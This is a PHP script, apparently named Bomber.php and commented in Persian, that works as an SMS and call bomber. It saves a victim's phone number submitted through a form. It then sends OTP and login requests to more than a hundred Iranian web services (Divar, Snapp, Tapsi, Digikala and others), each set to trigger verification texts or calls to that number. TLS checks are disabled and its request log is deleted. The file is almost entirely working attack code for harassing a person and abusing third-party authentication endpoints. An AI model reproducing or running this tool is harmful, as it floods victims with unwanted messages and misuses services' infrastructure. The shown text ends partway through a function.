<?php
set_time_limit(10);

// مسیر فایل شماره‌های ذخیره‌شده
$phone_file = 'phones.txt';

// بررسی اینکه آیا فایل شماره‌ها وجود دارد یا نه
if (!file_exists($phone_file)) {
    file_put_contents($phone_file, ""); // اگر فایل وجود ندارد، یک فایل خالی ایجاد می‌کنیم
}

if (isset($_POST['phone'])) {
    if (preg_match("/^([0][9][0-9]{9})$/", $_POST['phone'])) {
        $phone = $_POST['phone'];

        // خواندن شماره‌های قبلی از فایل
        $existing_phones = file($phone_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        // بررسی اینکه آیا شماره وارد شده قبلاً وجود دارد یا خیر
        if (!in_array($phone, $existing_phones)) {
            // اگر شماره جدید است، آن را به فایل اضافه می‌کنیم
            file_put_contents($phone_file, $phone . PHP_EOL, FILE_APPEND);
        }
        
        $phone = $_POST['phone'];
        // اگر دکمه «پیامک» زده شده (پیامک)
        if(isset($_POST['submit'])) {
            all($phone);
            header("Location:Bomber.php?ok=true");
        }
        // اگر دکمه «تماس» زده شده
        elseif(isset($_POST['call'])) {
            all_calls($phone);
            header("Location:Bomber.php?okCall=true");
        }
    } else {
        header("Location:Bomber.php?number=0");
    }
}

function all($phone)
{
    divar($phone);
    nobatir($phone);
    alopeyk_login($phone); // Depends on user status
    alopeyk_signup($phone); // Depends on user status
    shahrefarsh($phone);
    digistyle($phone); // Depends on user status
    snapp_express($phone);
    azki($phone);
    digikala_jet($phone);
    snapp_drivers($phone);
    ostadkar($phone);
    miare($phone);
    tapsi_drivers($phone);
    tapsi_passenger($phone);
    banimode($phone);
    taaghche_login($phone);
    taaghche_signup($phone);
    mobit($phone);
    jabama($phone);
    ghabzino($phone);
    komodaa($phone);
    barghe_man($phone);
    vandar($phone);
    pinorest($phone);
    tetherland($phone);
    alibaba($phone);
    drdr($phone);
    drnext($phone);
    classino($phone);
    takshopaccessorise($phone);
     snappmarket($phone);
    chartex($phone);
    snapptrip($phone);
    okcs($phone);
    takshopaccessorise($phone);
    bitpin($phone);
    publisha($phone);
    wisgoon($phone);
    snappdoctor($phone);
    tagmond($phone);
    doctoreto($phone);
    olgoo($phone);
    pakhsh($phone);
    didnegar($phone);
    see5($phone);
    ghabzino($phone);
    simkhan($phone);
    drsaina($phone);
    limome($phone);
    devsloop($phone);
    hiword($phone);
    behzadshami($phone);
    ghasedak24($phone);
    iranketab($phone);
    ketabchi($phone);
    takfarsh($phone);
    dadpardaz($phone);
    iranicard($phone);
    pubgsell($phone);
    tj8($phone);
    mashinbank($phone);
    cinematicket($phone);
    kafegheymat($phone);
    snappexpress($phone);
    opco($phone);
    melix($phone);
    safiran($phone);
    pirankalaco($phone);
    tnovin($phone);
    dastakht($phone);
    hamlex($phone);
    irwco($phone);
    moshaveran724($phone);
    sibbank($phone);
    steelalborz($phone);
    arshian($phone);
    topnoor($phone);
    alinance($phone);
    alopeyk($phone);
    alopeyksafir($phone);
    chaymarket($phone);
    coffefastfoodluxury($phone);
    dosma($phone);
    ehteraman($phone);
    mcishop($phone);
    hamrahbours($phone);
    homtick($phone);
    iranamlaak($phone);
    karchidari($phone);
    mazoo($phone);
    paymishe($phone);
    podro($phone);
    rayshomar($phone);
    amoomilad($phone);
    ashrafi($phone);
    bandarazad($phone);
    bazidone($phone);
    bigtoys($phone);
    bitex24($phone);
    candoosms($phone);
    farsgraphic($phone);
    glite($phone);
    hemat($phone);
    kodakamoz($phone);
    mipersia($phone);
    novibook($phone);
    offch($phone);
    sabziman($phone);
    tajtehran($phone);
     snappfood($phone);
    bitbarg($phone);
    bahramshop($phone);
    tak($phone);
    chamedon($phone);
    kilid($phone);
    otaghak($phone);
    shab($phone);
    raybit($phone);
    farvi($phone);
    namava($phone);
    a4baz($phone);
    anargift($phone);
    nobat($phone);
    ayantech($phone);
    simkhan($phone);
    sibirani($phone);
    hyperjan($phone);
    digikala($phone);
    hiword($phone);
    tikban($phone);
    dicardo($phone);
    digistyle($phone);
    banankala($phone);
    offdecor($phone);
    exo($phone);
    shahrefarsh($phone);
    beheshticarpet($phone);
    khanomi($phone);
    rojashop($phone);
    dadpardaz($phone);
    rokla($phone);
    khodro45($phone);
    pezeshket($phone);
    virgool($phone);
    timcheh($phone);
    paklean($phone);
    daal($phone);
    bimebazar($phone);
    azki($phone);
    safarmarket($phone);
    shad($phone);
    emtiaz($phone);
    azinja($phone);
    bama($phone);
    digify($phone);
      snapp($phone);
    tapsi($phone);
    torob($phone);
    snapmarket($phone);
    behtarino($phone);
    bit24($phone);
    drto($phone);
    okala($phone);
    banimod($phone);
    beroozmarket($phone);
    itoll($phone);
    gap($phone);
    pinket($phone);
    football360($phone);
    pinorest($phone);
    mrbilit($phone);
    hamrahmechanich($phone);
    lendo($phone);
    taghche($phone);
    fidibo($phone);
    khodro45($phone);
    pateh($phone);
    ketabchi($phone);
    reyanertebet($phone);
    bimito($phone);
    pindo($phone);
    delino($phone);
    zoodex($phone);
    kukala($phone);
    baskol($phone);
    threetex($phone);
    deniizshop($phone);
    flightio($phone);
    abantether($phone);
    pooleno($phone);
    wideapp($phone);
    iranlms($phone);
}

// توابع موجود برای ارسال پیامک (همانند نسخه اولیه)
function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

function CURL_SMS($URL, $PHONE_VALUE, $HEADER1 = NULL, $HEADER2 = NULL)
{
    global $response;
    date_default_timezone_set("Asia/Tehran");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    if ($HEADER1 != NULL) {
        if ($HEADER2 != NULL) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1, $HEADER2
            ]);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1
            ]);
        }
    }
    curl_setopt($ch, CURLOPT_POSTFIELDS, $PHONE_VALUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    file_put_contents('log.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $URL . ']' . $response . "\n\n", FILE_APPEND);
    curl_close($ch);
    sleep(1);
    $FileName = "log.txt";
    $FileHandle = fopen($FileName, 'w') or die("can't open file");
    fclose($FileHandle);
    unlink($FileName);
}

function CURL_GET($url, $headers = null) {
    global $response;
    date_default_timezone_set("Asia/Tehran");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    if ($headers != null) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, is_array($headers) ? $headers : [$headers]);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    file_put_contents('log.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $url . ']' . $response . "\n\n", FILE_APPEND);
    curl_close($ch);
    sleep(1);
    $FileName = "log.txt";
    $FileHandle = fopen($FileName, 'w') or die("can't open file");
    fclose($FileHandle);
    unlink($FileName);
}

function CURL_POST($url, $data, $headers = null) {
    global $response;
    date_default_timezone_set("Asia/Tehran");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    if ($headers != null) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, is_array($headers) ? $headers : [$headers]);
    }
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    file_put_contents('log.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $url . ']' . $response . "\n\n", FILE_APPEND);
    curl_close($ch);
    sleep(1);
    $FileName = "log.txt";
    $FileHandle = fopen($FileName, 'w') or die("can't open file");
    fclose($FileHandle);
    unlink($FileName);
}


function divar($phone)
{
    $url = 'https://api.divar.ir/v5/auth/authenticate';
    $phone_value = '{"phone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

function nobatir($phone)
{
    $url = 'https://nobat.ir/api/public/patient/login/phone';
    $phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $phone . "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n";
    $header = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY';
    CURL_SMS($url, $phone_value, $header);
}

function alopeyk_login($phone)
{
    $phone = (int)$phone;  // حذف صفر ابتدایی
    $url = 'https://api.alopeyk.com/api/v2/login?platform=pwa';
    $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function alopeyk_signup($phone)
{
    $url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa';
    $phone_value = "{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"" . $phone . "\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}";
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function shahrefarsh($phone)
{
    $url = 'https://shahrfarsh.com/Account/Login';
    $phone_value = 'phoneNumber=' . $phone;
    CURL_SMS($url, $phone_value);
}

function digistyle($phone)
{
    global $response;
    $url = 'https://www.digistyle.com/users/login-register/';
    $phone_value = 'loginRegister%5Bemail_phone%5D=' . $phone;
    CURL_SMS($url, $phone_value);
    $token = preg_match('/(?<=token=)(.*)(?=&amp)/', $response, $tok);
    file_get_contents('https://www.digistyle.com/users/register/confirm/?token=' . $tok[0] . '&type=register');
}

function snapp_express($phone)
{
    $url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b';
    $phone_value = 'cellphone=' . $phone . '&captcha=&optionalLoginToken=true&local=';
    CURL_SMS($url, $phone_value);
}

function azki($phone)
{
    $url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'deviceid: 6';
    CURL_SMS($url, $phone_value, $header1, $header2);
}

function digikala_jet($phone)
{
    $url = 'https://api.digikalajet.ir/user/login-register/';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function snapp_drivers($phone)
{
    $url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=';
    $phone_value = '{"cellphone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

function ostadkar($phone)
{
    $url = 'https://api.ostadkr.com/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

function miare($phone)
{
    $url = 'https://www.miare.ir/api/otp/driver/request/';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function tapsi_drivers($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"DRIVER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function tapsi_passenger($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"PASSENGER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function banimode($phone)
{
    $url = 'https://mobapi.banimode.com/api/v2/auth/request';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function drdr($phone)
{
    $url = 'https://drdr.ir/api/v3/auth/login/mobile/init';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'client-id: f60d5037-b7ac-404a-9e3a-a263fd9f8054';
    CURL_SMS($url, $phone_value, $header1, $header2);
}

function taaghche_login($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/login';
    $phone_value = '{"contact":"' . $phone . '","forceOtp":false}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function taaghche_signup($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/signup';
    $phone_value = '{"contact":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function komodaa($phone)
{
    $url = 'https://api.komodaa.com/api/v2.6/loginRC/request';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function ghabzino($phone)
{
    $url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode';
    $phone_value = '{"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":null,"ApplicationVersion":"1.0.0","MobileNumber":"' . $phone . '","UniqueToken":null}}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function barghe_man($phone)
{
    $url = 'https://uiapi2.saapa.ir/api/otp/sendCode';
    $phone_value = '{"mobile":"' . $phone . '","from_meter_buy":false}';
    CURL_SMS($url, $phone_value);
}

function vandar($phone)
{
    $url = 'https://api.vandar.io/account/v1/check/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function mobit($phone)
{
    $url = 'https://api.mobit.ir/api/web/v8/register/register';
    $phone_value = '{"number":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function jabama($phone)
{
    $url = 'https://taraazws.jabama.com/api/v4/account/send-code';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function pinorest($phone)
{
    $url = 'https://api.pinorest.com/frontend/auth/login/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function tetherland($phone)
{
    $url = 'https://service.tetherland.com/api/v5/login-register';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function alibaba($phone)
{
    $url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function drnext($phone)
{
    $url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token';
    $phone_values = '{"source":"besina","mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_values, $header);
}

function classino($phone)
{
    $url = 'https://student.classino.com/otp/v1/api/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $heaedr = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $heaedr);
}

function takshopaccessorise($phone)
{
    $url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request';
    $phone_value = '{"mobile_phone":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function tapsi($phone) {
    $url = "https://tap33.me/api/v2/user";
    $data = json_encode(["credential" => ["phoneNumber" => "0" . $phone, "role" => "PASSENGER"]]);
    CURL_POST($url, $data);
}
function snapmarket($phone) {
    $url = "https://account.api.balad.ir/api/web/auth/login/";
    $data = json_encode([
        "phone_number" => "0" . $phone,
        "os_type" => "W"
    ]);
    CURL_POST($url, $data);
}
function torob($phone) {
    $url = "https://api.torob.com/a/phone/send-pin/?phone_number=0" . $phone;
    $headers = [
        "Host: api.torob.com",
        "user-agent: Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "accept: */*",
        "origin: https://torob.com",
        "sec-fetch-site: same-site",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://torob.com/user/",
        "accept-encoding: gzip, deflate, br",
        "accept-language: fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
        "cookie: amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com=eyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"
    ];
    CURL_GET($url, $headers);
}

function snapp($phone) {
    $url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp";
    $data = json_encode(["cellphone" => "+98" . $phone]);
    $headers = [
        "Host: app.snapp.taxi",
        "content-length: " . strlen($data),
        "x-app-name: passenger-pwa",
        "x-app-version: 5.0.0",
        "app-version: pwa",
        "user-agent: Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://app.snapp.taxi",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://app.snapp.taxi/login/?redirect_to=%2F",
        "accept-encoding: gzip, deflate, br",
        "accept-language: fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
        "cookie: _gat=1"
    ];
    CURL_POST($url, $data, $headers);
}
function behtarino($phone) {
    $url = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function bit24($phone) {
    $url = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile";
    $data = json_encode([
        "mobile" => "0" . $phone,
        "contry_code" => "98"
    ]);
    CURL_POST($url, $data);
}


function drto($phone) {
    $url = "https://api.doctoreto.com/api/web/patient/v1/accounts/register";
    $data = json_encode([
        "mobile" => $phone,
        "country_id" => 205
    ]);
    CURL_POST($url, $data);
}

function okala($phone) {
    $url = "https://api-react.okala.com/C/CustomerAccount/OTPRegister";
    $data = json_encode([
        "mobile" => "0" . $phone,
        "deviceTypeCode" => 0,
        "confirmTerms" => true,
        "notRobot" => false
    ]);
    CURL_POST($url, $data);
}


function beroozmarket($phone) {
    $url = "https://api.beroozmart.com/api/pub/account/send-otp";
    $data = json_encode([
        "mobile" => "0" . $phone,
        "sendViaSms" => true,
        "email" => "null",
        "sendViaEmail" => false
    ]);
    CURL_POST($url, $data);
}
function itoll($phone) {
    $url = "https://app.itoll.com/api/v1/auth/login";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function pinket($phone) {
    $url = "https://pinket.com/api/cu/v2/phone-verification";
    $data = json_encode(["phoneNumber" => "0" . $phone]);
    CURL_POST($url, $data);
}
function football360($phone) {
    $url = "https://football360.ir/api/auth/verify-phone/";
    $data = json_encode(["phone_number" => "+98" . $phone]);
    CURL_POST($url, $data);
}

function mrbilit($phone) {
    $url = "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0" . $phone . "&source=2&sendTokenIfNot=true";
    CURL_GET($url);
}

function hamrahmechanich($phone) {
    $url = "https://www.hamrah-mechanic.com/api/v1/membership/otp";
    $data = json_encode([
        "PhoneNumber" => "0" . $phone,
        "prevDomainUrl" => "https://www.google.com/",
        "landingPageUrl" => "https://www.hamrah-mechanic.com/cars-for-sale/",
        "orderPageUrl" => "https://www.hamrah-mechanic.com/membersignin/",
        "prevUrl" => "https://www.hamrah-mechanic.com/cars-for-sale/",
        "referrer" => "https://www.google.com/"
    ]);
    CURL_POST($url, $data);
}
function lendo($phone) {
    $url = "https://api.lendo.ir/api/customer/auth/send-otp";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function taghche($phone) {
    $url = "https://gw.taaghche.com/v4/site/auth/login";
    $data = json_encode([
        "contact" => "0" . $phone,
        "forceOtp" => false
    ]);
    CURL_POST($url, $data);
}

function fidibo($phone) {
    $url = "https://fidibo.com/user/login-by-sms";
    $data = "mobile_number=" . $phone . "&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09";
    CURL_POST($url, $data);
}

function khodro45($phone) {
    $url = "https://khodro45.com/api/v1/customers/otp/";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}
function pateh($phone) {
    $url = "https://api.pateh.com/api/v1/LoginOrRegister";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function ketabchi($phone) {
    $url = "https://ketabchi.com/api/v1/auth/requestVerificationCode";
    $data = json_encode(["auth" => ["phoneNumber" => "0" . $phone]]);
    CURL_POST($url, $data);
}

function reyanertebet($phone) {
    $url = "https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811";
    $data = json_encode(["mobileNo" => "0" . $phone]);
    CURL_POST($url, $data);
}


function bimito($phone) {
    $url = "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code";
    $data = json_encode([
        "phoneNumber" => "0" . $phone,
        "isResend" => false
    ]);
    CURL_POST($url, $data);
}

function pindo($phone) {
    $url = "https://api.pindo.ir/v1/user/login-register/";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function delino($phone) {
    $url = "https://www.delino.com/user/register";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function zoodex($phone) {
    $url = "https://admin.zoodex.ir/api/v1/login/check";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function kukala($phone) {
    $url = "https://api.kukala.ir/api/user/Otp";
    $data = json_encode(["phoneNumber" => "0" . $phone]);
    CURL_POST($url, $data);
}

function baskol($phone) {
    $url = "https://www.buskool.com/send_verification_code";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function threetex($phone) {
    $url = "https://3tex.io/api/1/users/validation/mobile";
    $data = json_encode(["receptorPhone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function deniizshop($phone) {
    $url = "https://deniizshop.com/api/v1/sessions/login_request";
    $data = json_encode(["mobile_number" => "0" . $phone]);
    CURL_POST($url, $data);
}

function flightio($phone) {
    $url = "https://flightio.com/bff/Authentication/CheckUserKey";
    $data = json_encode(["userKey" => "0" . $phone]);
    CURL_POST($url, $data);
}

function abantether($phone) {
    $url = "https://abantether.com/users/register/phone/send/";
    $data = json_encode(["phoneNumber" => "0" . $phone]);
    CURL_POST($url, $data);
}

function pooleno($phone) {
    $url = "https://api.pooleno.ir/v1/auth/check-mobile";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function wideapp($phone) {
    $url = "https://agent.wide-app.ir/auth/token";
    $data = json_encode([
        "grant_type" => "otp",
        "client_id" => "62b30c4af53e3b0cf100a4a0",
        "phone" => "0" . $phone
    ]);
    CURL_POST($url, $data);
}


function iranlms($phone) {
    $url = "https://messengerg2c4.iranlms.ir/";
    $data = json_encode(["se" => "0" . $phone]);
    CURL_POST($url, $data);
}


function snappfood($phone) {
    $url = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa";
    $data = json_encode(["cellphone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function bitbarg($phone) {
    $url = "https://api.bitbarg.com/api/v1/authentication/registerOrLogin";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function bahramshop($phone) {
    $url = "https://api.bahramshop.ir/api/user/validate/username";
    $data = json_encode(["username" => "0" . $phone]);
    CURL_POST($url, $data);
}

function tak($phone) {
    $url = "https://takshopaccessorise.ir/api/v1/sessions/login_request";
    $data = json_encode(["mobile_phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function chamedon($phone) {
    $url = "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function kilid($phone) {
    $url = "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}
function otaghak($phone) {
    $url = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode";
    $data = json_encode(["userName" => "0" . $phone]);
    CURL_POST($url, $data);
}

function shab($phone) {
    $url = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function raybit($phone) {
    $url = "https://api.raybit.net:3111/api/v1/authentication/register/mobile";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function farvi($phone) {
    $url = "https://farvi.shop/api/v1/sessions/login_request";
    $data = json_encode(["mobile_phone" => "0" . $phone]);
    CURL_POST($url, $data);
}
function namava($phone) {
    $url = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request";
    $data = json_encode(["UserName" => "0" . $phone]);
    CURL_POST($url, $data);
}

function a4baz($phone) {
    $url = "https://a4baz.com/api/web/login";
    $data = json_encode(["cellphone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function anargift($phone) {
    $url = "https://api.anargift.com/api/people/auth";
    $data = json_encode(["user" => "0" . $phone]);
    CURL_POST($url, $data);
}

function nobat($phone) {
    $url = "https://nobat.ir/api/public/patient/login/phone";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}
function ayantech($phone) {
    $url = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode";
    $data = json_encode([
        "Parameters" => [
            "ApplicationType" => "Web",
            "ApplicationUniqueToken" => null,
            "ApplicationVersion" => "1.0.0",
            "MobileNumber" => "0" . $phone
        ]
    ]);
    CURL_POST($url, $data);
}

function simkhan($phone) {
    $url = "https://www.simkhanapi.ir/api/users/registerV2";
    $data = json_encode(["mobileNumber" => "0" . $phone]);
    CURL_POST($url, $data);
}

function sibirani($phone) {
    $url = "https://sandbox.sibirani.ir/api/v1/user/invite";
    $data = json_encode(["username" => "0" . $phone]);
    CURL_POST($url, $data);
}

function hyperjan($phone) {
    $url = "https://shop.hyperjan.ir/api/users/manage";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function digikala($phone) {
    $url = "https://api.digikala.com/v1/user/authenticate/";
    $data = json_encode(["username" => "0" . $phone]);
    CURL_POST($url, $data);
}

function hiword($phone) {
    $url = "https://hiword.ir/wp-json/otp-login/v1/login";
    $data = json_encode(["identifier" => "0" . $phone]);
    CURL_POST($url, $data);
}
function tikban($phone) {
    $url = "https://tikban.com/Account/LoginAndRegister";
    $data = json_encode(["cellPhone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function dicardo($phone) {
    $url = "https://dicardo.com/main/sendsms";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}


function banankala($phone) {
    $url = "https://banankala.com/home/login";
    $data = json_encode(["Mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function offdecor($phone) {
    $url = "https://www.offdecor.com/index.php?route=account/login/sendCode";
    $data = json_encode(["phone" => "0" . $phone]);
    CURL_POST($url, $data);
}

function exo($phone) {
    $url = "https://exo.ir/index.php?route=account/mobile_login";
    $data = json_encode(["mobile_number" => "0" . $phone]);
    CURL_POST($url, $data);
}



function beheshticarpet($phone) {
    $url = "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php";
    $data = json_encode(["phone_email" => "0" . $phone]);
    CURL_POST($url, $data);
}

function khanomi($phone) {
    $url = "https://www.khanoumi.com/accounts/sendotp";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}

function rojashop($phone) {
    $url = "https://rojashop.com/api/auth/sendOtp";
    $data = json_encode(["mobile" => "0" . $phone]);
    CURL_POST($url, $data);
}
function dadpardaz($phone) {
    $url = "https://dadpardaz.com/advice/getLoginConfirmationCode";
